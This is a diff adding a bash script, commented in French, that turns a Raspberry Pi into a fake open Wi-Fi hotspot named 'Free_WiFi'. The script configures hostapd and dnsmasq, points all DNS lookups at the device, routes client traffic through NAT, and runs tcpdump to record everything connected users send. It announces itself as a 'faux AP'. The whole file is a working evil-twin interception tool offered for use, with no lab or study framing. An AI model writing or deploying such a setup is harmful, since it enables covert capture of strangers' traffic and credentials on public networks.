@@ -1,0 +1,78 @@
+#!/bin/bash
+
+set -e
+
+echo "[*] Mise à jour du système..."
+apt update && apt upgrade -y
+
+echo "[*] Installation des paquets nécessaires..."
+apt install -y aircrack-ng hostapd dnsmasq iptables tcpdump
+
+echo "[*] Configuration du point d’accès..."
+
+# Config hostapd
+cat <<EOF > /etc/hostapd/hostapd.conf
+interface=wlan1
+driver=nl80211
+ssid=Free_WiFi
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+sed -i 's|#DAEMON_CONF=""|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
+
+echo "[*] Configuration DHCP et DNS avec dnsmasq..."
+
+# Sauvegarde ancienne conf
+mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig || true
+
+cat <<EOF > /etc/dnsmasq.conf
+interface=wlan1
+dhcp-range=192.168.1.2,192.168.1.100,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+address=/#/192.168.1.1
+EOF
+
+echo "[*] Configuration IP statique pour wlan1..."
+cat <<EOF >> /etc/dhcpcd.conf
+
+interface wlan1
+    static ip_address=192.168.1.1/24
+    nohook wpa_supplicant
+EOF
+
+echo "[*] Activation du forwarding IP..."
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+sysctl -p
+
+echo "[*] Configuration NAT avec iptables..."
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
+
+echo "[*] Enregistrement des règles iptables..."
+sh -c "iptables-save > /etc/iptables.ipv4.nat"
+
+# Charger iptables au démarrage
+grep -qxF 'iptables-restore < /etc/iptables.ipv4.nat' /etc/rc.local || sed -i '$i\iptables-restore < /etc/iptables.ipv4.nat' /etc/rc.local
+
+echo "[*] Redémarrage des services..."
+systemctl unmask hostapd
+systemctl enable hostapd
+systemctl enable dnsmasq
+
+echo "[*] Démarrage du point d’accès..."
+systemctl restart dhcpcd
+service hostapd start
+service dnsmasq start
+
+echo "[*] Lancement de tcpdump pour capture du trafic..."
+mkdir -p /home/pi/captures
+tcpdump -i wlan1 -w /home/pi/captures/capture.pcap &
+
+echo "[✓] Faux AP WiFi actif !"
+echo "[!] SSID : Free_WiFi | IP : 192.168.1.1"
+echo "[!] Capture en cours dans /home/pi/captures/capture.pcap"
